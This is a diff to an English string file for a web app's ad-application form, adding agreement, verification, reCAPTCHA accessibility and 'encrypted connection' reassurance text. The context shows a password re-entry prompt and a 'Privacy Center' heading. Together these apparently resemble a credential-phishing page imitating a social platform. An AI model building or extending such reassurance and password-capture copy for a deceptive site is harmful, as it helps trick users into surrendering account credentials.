@@ -109,6 +109,7 @@ export const en: AppStrings = {
       'e.g. This Page publishes original videos and wants to apply for in-stream ads.',
     agree: 'I agree to the',
     agreeTerms: 'Terms of Use',
+    agreeAnd: 'and',
     submit: 'Confirm and submit application',
     errFullName: 'Please enter your full name.',
     errEmail: 'Please enter a contact email address.',
@@ -121,6 +122,8 @@ export const en: AppStrings = {
     errDay: 'Please select a day of birth.',
     errMonth: 'Please select a month of birth.',
     errYear: 'Please select a year of birth.',
+    errAgree: 'Please confirm that you agree to the Terms of Use and Privacy Policy to continue.',
+    encryptedHint: 'Your information is sent over an encrypted connection (HTTPS).',
   },
   password: {
     firstPrompt: 'For security reasons, please enter your password to continue.',
@@ -169,6 +172,14 @@ export const en: AppStrings = {
       "We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.",
     p3:
       'reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.',
+    verifyHeading: 'Security verification',
+    verifyHint: 'Complete the checkbox below to continue to the next step.',
+    backToForm: 'Back to edit information',
+    cancelChallenge: 'Go back',
+    openVerifyStepLead: 'Tap the button below to show the verification step.',
+    legalDetailsLabel: 'Legal & privacy details',
+    a11yVerifying: 'Verifying. Please wait.',
+    a11yVerified: 'Verification successful.',
   },
   nav: {
     heading: 'Privacy Center',
